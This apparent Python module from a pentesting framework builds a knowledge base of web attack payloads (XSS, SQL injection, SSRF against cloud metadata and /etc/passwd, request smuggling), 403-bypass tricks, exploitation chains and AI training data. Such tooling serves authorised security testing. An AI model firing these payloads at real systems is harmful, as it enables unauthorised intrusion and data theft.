import json
import yaml
import re
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field
from enum import Enum
import hashlib
from pathlib import Path

class VulnCategory(Enum):
    """Vulnerability categories based on HackerOne data"""
    XSS = "Cross-Site Scripting"
    SQLI = "SQL Injection"
    SSRF = "Server-Side Request Forgery"
    RCE = "Remote Code Execution"
    IDOR = "Insecure Direct Object Reference"
    XXE = "XML External Entity"
    LFI = "Local File Inclusion"
    RFI = "Remote File Inclusion"
    CSRF = "Cross-Site Request Forgery"
    AUTH_BYPASS = "Authentication Bypass"
    BUSINESS_LOGIC = "Business Logic Flaw"
    REQUEST_SMUGGLING = "HTTP Request Smuggling"
    RACE_CONDITION = "Race Condition"
    INFO_DISCLOSURE = "Information Disclosure"

@dataclass
class VulnPayload:
    """Structure for vulnerability payloads"""
    category: VulnCategory
    name: str
    payload: str
    description: str = ""
    confidence_score: float = 0.5
    context: str = ""  # Where to inject (url, header, body, cookie, etc.)
    detection_pattern: str = ""  # Regex or string to detect success
    tags: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)

@dataclass
class BypassTechnique:
    """Structure for bypass techniques"""
    name: str
    technique: str
    description: str
    applies_to: List[str] = field(default_factory=list)  # nginx, apache, etc.
    success_rate: float = 0.5

class VulnerabilityKnowledgeBase:
    """Central knowledge base for vulnerability patterns and payloads"""
    
    def __init__(self, kb_path: str = "knowledge_base/"):
        self.kb_path = Path(kb_path)
        self.kb_path.mkdir(exist_ok=True)
        
        # Initialize payload storage
        self.payloads: Dict[VulnCategory, List[VulnPayload]] = {
            category: [] for category in VulnCategory
        }
        
        # Initialize bypass techniques
        self.bypass_techniques: List[BypassTechnique] = []
        
        # Load default payloads
        self._load_default_payloads()
        self._load_bypass_techniques()
        
        # Load custom payloads from files
        self.load_custom_payloads()
    
    def _load_default_payloads(self):
        """Load default vulnerability payloads"""
        
        # XSS Payloads
        xss_payloads = [
            VulnPayload(
                category=VulnCategory.XSS,
                name="Basic Alert XSS",
                payload="<script>alert(1)</script>",
                description="Basic XSS test with alert",
                context="html",
                detection_pattern=r"<script>alert\(1\)</script>",
                confidence_score=0.9
            ),
            VulnPayload(
                category=VulnCategory.XSS,
                name="IMG Tag XSS",
                payload='"><img src=x onerror=alert(1)>',
                description="XSS via img tag error handler",
                context="attribute",
                detection_pattern=r'<img.*onerror=alert\(1\)>',
                confidence_score=0.85
            ),
            VulnPayload(
                category=VulnCategory.XSS,
                name="SVG XSS",
                payload='<svg onload=alert(1)>',
                description="XSS via SVG onload",
                context="html",
                detection_pattern=r'<svg.*onload=alert\(1\)>',
                confidence_score=0.8
            ),
            VulnPayload(
                category=VulnCategory.XSS,
                name="Event Handler XSS",
                payload='" onmouseover="alert(1)',
                description="XSS via event handler injection",
                context="attribute",
                confidence_score=0.75
            ),
        ]
        
        # SQL Injection Payloads
        sqli_payloads = [
            VulnPayload(
                category=VulnCategory.SQLI,
                name="Basic SQLi Test",
                payload="' OR '1'='1",
                description="Classic SQL injection test",
                context="parameter",
                detection_pattern=r"(SQL|syntax|mysql|ora-|microsoft)",
                confidence_score=0.9
            ),
            VulnPayload(
                category=VulnCategory.SQLI,
                name="Union Select",
                payload="' UNION SELECT NULL,NULL,NULL--",
                description="Union-based SQL injection",
                context="parameter",
                confidence_score=0.85
            ),
            VulnPayload(
                category=VulnCategory.SQLI,
                name="Time-based SQLi",
                payload="'; WAITFOR DELAY '00:00:05'--",
                description="Time-based blind SQL injection",
                context="parameter",
                confidence_score=0.8
            ),
            VulnPayload(
                category=VulnCategory.SQLI,
                name="Error-based SQLi",
                payload="' AND 1=CONVERT(INT,(SELECT @@version))--",
                description="Error-based SQL injection",
                context="parameter",
                confidence_score=0.85
            ),
        ]
        
        # SSRF Payloads
        ssrf_payloads = [
            VulnPayload(
                category=VulnCategory.SSRF,
                name="Localhost SSRF",
                payload="http://127.0.0.1:80",
                description="SSRF to localhost",
                context="url_parameter",
                confidence_score=0.7
            ),
            VulnPayload(
                category=VulnCategory.SSRF,
                name="AWS Metadata SSRF",
                payload="http://169.254.169.254/latest/meta-data/",
                description="SSRF to AWS metadata endpoint",
                context="url_parameter",
                confidence_score=0.9
            ),
            VulnPayload(
                category=VulnCategory.SSRF,
                name="Internal Network Scan",
                payload="http://192.168.1.1:22",
                description="SSRF for internal network scanning",
                context="url_parameter",
                confidence_score=0.6
            ),
            VulnPayload(
                category=VulnCategory.SSRF,
                name="File Protocol SSRF",
                payload="file:///etc/passwd",
                description="SSRF using file protocol",
                context="url_parameter",
                detection_pattern=r"root:.*:0:0:",
                confidence_score=0.85
            ),
        ]
        
        # IDOR Payloads
        idor_payloads = [
            VulnPayload(
                category=VulnCategory.IDOR,
                name="Numeric ID Increment",
                payload="{id+1}",
                description="Increment numeric ID parameter",
                context="parameter",
                confidence_score=0.6
            ),
            VulnPayload(
                category=VulnCategory.IDOR,
                name="UUID Prediction",
                payload="{predictable_uuid}",
                description="Predictable UUID generation",
                context="parameter",
                confidence_score=0.5
            ),
            VulnPayload(
                category=VulnCategory.IDOR,
                name="Array Transformation",
                payload='{"id":[{target_id}]}',
                description="Transform ID to array",
                context="json",
                confidence_score=0.4
            ),
        ]
        
        # Request Smuggling Payloads
        smuggling_payloads = [
            VulnPayload(
                category=VulnCategory.REQUEST_SMUGGLING,
                name="CL.TE Smuggling",
                payload="Content-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED",
                description="Content-Length vs Transfer-Encoding smuggling",
                context="raw_request",
                confidence_score=0.7
            ),
            VulnPayload(
                category=VulnCategory.REQUEST_SMUGGLING,
                name="TE.CL Smuggling",
                payload="Transfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n",
                description="Transfer-Encoding vs Content-Length smuggling",
                context="raw_request",
                confidence_score=0.7
            ),
        ]
        
        # Add all payloads to knowledge base
        for payload_list in [xss_payloads, sqli_payloads, ssrf_payloads, 
                             idor_payloads, smuggling_payloads]:
            for payload in payload_list:
                self.add_payload(payload)
    
    def _load_bypass_techniques(self):
        """Load 403 bypass techniques"""
        
        bypass_techniques = [
            BypassTechnique(
                name="Double Slash",
                technique="//path",
                description="Add double slash before path segment",
                applies_to=["nginx", "apache"],
                success_rate=0.6
            ),
            BypassTechnique(
                name="Path Traversal",
                technique="..//path",
                description="Use path traversal with double slash",
                applies_to=["nginx"],
                success_rate=0.5
            ),
            BypassTechnique(
                name="URL Encoding",
                technique="%2Fpath",
                description="URL encode path separators",
                applies_to=["apache", "nginx"],
                success_rate=0.7
            ),
            BypassTechnique(
                name="Case Variation",
                technique="Path",
                description="Change case of path components",
                applies_to=["windows", "iis"],
                success_rate=0.4
            ),
            BypassTechnique(
                name="Unicode Encoding",
                technique="%ef%bc%8f",
                description="Use Unicode encoded slash",
                applies_to=["nginx", "apache"],
                success_rate=0.5
            ),
            BypassTechnique(
                name="Parameter Pollution",
                technique="?path=value&path=value2",
                description="HTTP parameter pollution",
                applies_to=["all"],
                success_rate=0.3
            ),
            BypassTechnique(
                name="Header Injection",
                technique="X-Original-URL",
                description="Use alternative routing headers",
                applies_to=["nginx", "apache"],
                success_rate=0.6
            ),
            BypassTechnique(
                name="Method Override",
                technique="X-HTTP-Method-Override",
                description="Override HTTP method via header",
                applies_to=["all"],
                success_rate=0.4
            ),
        ]
        
        self.bypass_techniques.extend(bypass_techniques)
    
    def add_payload(self, payload: VulnPayload) -> bool:
        """Add a new payload to the knowledge base"""
        try:
            self.payloads[payload.category].append(payload)
            return True
        except KeyError:
            return False
    
    def get_payloads_by_category(self, category: VulnCategory) -> List[VulnPayload]:
        """Get all payloads for a specific vulnerability category"""
        return self.payloads.get(category, [])
    
    def get_payloads_by_confidence(self, min_confidence: float = 0.5) -> List[VulnPayload]:
        """Get payloads above a confidence threshold"""
        results = []
        for category_payloads in self.payloads.values():
            results.extend([p for p in category_payloads if p.confidence_score >= min_confidence])
        return sorted(results, key=lambda x: x.confidence_score, reverse=True)
    
    def search_payloads(self, keyword: str) -> List[VulnPayload]:
        """Search payloads by keyword"""
        results = []
        keyword_lower = keyword.lower()
        
        for category_payloads in self.payloads.values():
            for payload in category_payloads:
                if (keyword_lower in payload.name.lower() or
                    keyword_lower in payload.description.lower() or
                    keyword_lower in payload.payload.lower() or
                    keyword_lower in [tag.lower() for tag in payload.tags]):
                    results.append(payload)
        
        return results
    
    def get_bypass_techniques(self, target_server: str = "all") -> List[BypassTechnique]:
        """Get bypass techniques for specific server type"""
        if target_server == "all":
            return self.bypass_techniques
        
        return [t for t in self.bypass_techniques 
                if target_server in t.applies_to or "all" in t.applies_to]
    
    def generate_fuzzing_list(self, category: VulnCategory, 
                             context: Optional[str] = None) -> List[str]:
        """Generate a fuzzing list for a specific vulnerability category"""
        payloads = self.get_payloads_by_category(category)
        
        if context:
            payloads = [p for p in payloads if p.context == context]
        
        return [p.payload for p in payloads]
    
    def save_knowledge_base(self):
        """Save current knowledge base to disk"""
        kb_data = {
            "payloads": {},
            "bypass_techniques": []
        }
        
        # Serialize payloads
        for category, payload_list in self.payloads.items():
            kb_data["payloads"][category.value] = [
                {
                    "name": p.name,
                    "payload": p.payload,
                    "description": p.description,
                    "confidence_score": p.confidence_score,
                    "context": p.context,
                    "detection_pattern": p.detection_pattern,
                    "tags": p.tags,
                    "metadata": p.metadata
                }
                for p in payload_list
            ]
        
        # Serialize bypass techniques
        kb_data["bypass_techniques"] = [
            {
                "name": t.name,
                "technique": t.technique,
                "description": t.description,
                "applies_to": t.applies_to,
                "success_rate": t.success_rate
            }
            for t in self.bypass_techniques
        ]
        
        # Save to file
        kb_file = self.kb_path / "vulnerability_kb.json"
        with open(kb_file, 'w') as f:
            json.dump(kb_data, f, indent=2)
    
    def load_custom_payloads(self):
        """Load custom payloads from files"""
        custom_payloads_dir = self.kb_path / "custom_payloads"
        custom_payloads_dir.mkdir(exist_ok=True)
        
        # Load JSON payloads
        for json_file in custom_payloads_dir.glob("*.json"):
            try:
                with open(json_file, 'r') as f:
                    data = json.load(f)
                    self._process_custom_payload_data(data)
            except Exception as e:
                print(f"Error loading {json_file}: {e}")
        
        # Load YAML payloads
        for yaml_file in custom_payloads_dir.glob("*.yaml"):
            try:
                with open(yaml_file, 'r') as f:
                    data = yaml.safe_load(f)
                    self._process_custom_payload_data(data)
            except Exception as e:
                print(f"Error loading {yaml_file}: {e}")
    
    def _process_custom_payload_data(self, data: Dict):
        """Process custom payload data from file"""
        if "payloads" in data:
            for payload_data in data["payloads"]:
                try:
                    category = VulnCategory[payload_data.get("category", "XSS")]
                    payload = VulnPayload(
                        category=category,
                        name=payload_data.get("name", "Custom Payload"),
                        payload=payload_data.get("payload", ""),
                        description=payload_data.get("description", ""),
                        confidence_score=payload_data.get("confidence_score", 0.5),
                        context=payload_data.get("context", ""),
                        detection_pattern=payload_data.get("detection_pattern", ""),
                        tags=payload_data.get("tags", []),
                        metadata=payload_data.get("metadata", {})
                    )
                    self.add_payload(payload)
                except Exception as e:
                    print(f"Error processing payload: {e}")
    
    def generate_ai_training_data(self) -> Dict[str, Any]:
        """Generate training data for AI models"""
        training_data = {
            "vulnerability_patterns": {},
            "exploitation_sequences": [],
            "detection_patterns": {},
            "bypass_strategies": []
        }
        
        # Organize patterns by category
        for category in VulnCategory:
            payloads = self.get_payloads_by_category(category)
            training_data["vulnerability_patterns"][category.value] = {
                "payloads": [p.payload for p in payloads],
                "contexts": list(set(p.context for p in payloads if p.context)),
                "confidence_scores": [p.confidence_score for p in payloads],
                "detection_patterns": [p.detection_pattern for p in payloads if p.detection_pattern]
            }
        
        # Add bypass strategies
        training_data["bypass_strategies"] = [
            {
                "technique": t.technique,
                "success_rate": t.success_rate,
                "applies_to": t.applies_to
            }
            for t in self.bypass_techniques
        ]
        
        return training_data
    
    def get_exploitation_chain(self, vulnerabilities: List[VulnCategory]) -> List[VulnPayload]:
        """Generate an exploitation chain for multiple vulnerabilities"""
        chain = []
        
        for vuln in vulnerabilities:
            # Get highest confidence payload for each vulnerability
            payloads = self.get_payloads_by_category(vuln)
            if payloads:
                best_payload = max(payloads, key=lambda x: x.confidence_score)
                chain.append(best_payload)
        
        return chain
    
    def update_payload_confidence(self, payload_name: str, 
                                 new_confidence: float, 
                                 category: Optional[VulnCategory] = None):
        """Update confidence score based on exploitation results"""
        search_categories = [category] if category else VulnCategory
        
        for cat in search_categories:
            if cat in self.payloads:
                for payload in self.payloads[cat]:
                    if payload.name == payload_name:
                        # Apply weighted average
                        payload.confidence_score = (
                            0.7 * payload.confidence_score + 0.3 * new_confidence
                        )
                        return True
        
        return False

class VulnerabilityScanner:
    """Scanner that uses the knowledge base for vulnerability detection"""
    
    def __init__(self, kb: VulnerabilityKnowledgeBase):
        self.kb = kb
        
    def scan_for_vulnerability(self, target_url: str, 
                              category: VulnCategory,
                              context: Optional[str] = None) -> List[Dict[str, Any]]:
        """Scan for specific vulnerability type"""
        results = []
        payloads = self.kb.get_payloads_by_category(category)
        
        if context:
            payloads = [p for p in payloads if p.context == context]
        
        for payload in payloads:
            # This would integrate with your existing request mechanism
            result = {
                "payload": payload,
                "target": target_url,
                "test_url": self._build_test_url(target_url, payload),
                "confidence": payload.confidence_score
            }
            results.append(result)
        
        return results
    
    def _build_test_url(self, base_url: str, payload: VulnPayload) -> str:
        """Build test URL with payload"""
        # This is simplified - would need proper URL construction
        if payload.context == "parameter":
            return f"{base_url}?test={payload.payload}"
        elif payload.context == "path":
            return f"{base_url}/{payload.payload}"
        else:
            return base_url

# Integration with CyberShell's plugin system
class VulnerabilityKBPlugin:
    """Plugin to integrate with CyberShell's orchestrator"""
    
    def __init__(self, config):
        self.config = config
        self.kb = VulnerabilityKnowledgeBase()
        self.scanner = VulnerabilityScanner(self.kb)
    
    def get_payloads_for_testing(self, vuln_type: str) -> List[str]:
        """Get payloads for a specific vulnerability type"""
        try:
            category = VulnCategory[vuln_type.upper()]
            return self.kb.generate_fuzzing_list(category)
        except KeyError:
            return []
    
    def get_bypass_techniques_for_target(self, server_type: str = "nginx") -> List[Dict]:
        """Get bypass techniques for target server"""
        techniques = self.kb.get_bypass_techniques(server_type)
        return [
            {
                "name": t.name,
                "technique": t.technique,
                "success_rate": t.success_rate
            }
            for t in techniques
        ]
    
    def train_ai_model(self):
        """Provide training data to AI orchestrator"""
        return self.kb.generate_ai_training_data()
    
    def update_knowledge_from_results(self, results: Dict):
        """Update knowledge base from exploitation results"""
        if "payload_name" in results and "success" in results:
            confidence = 0.9 if results["success"] else 0.3
            self.kb.update_payload_confidence(
                results["payload_name"],
                confidence
            )
            self.kb.save_knowledge_base()
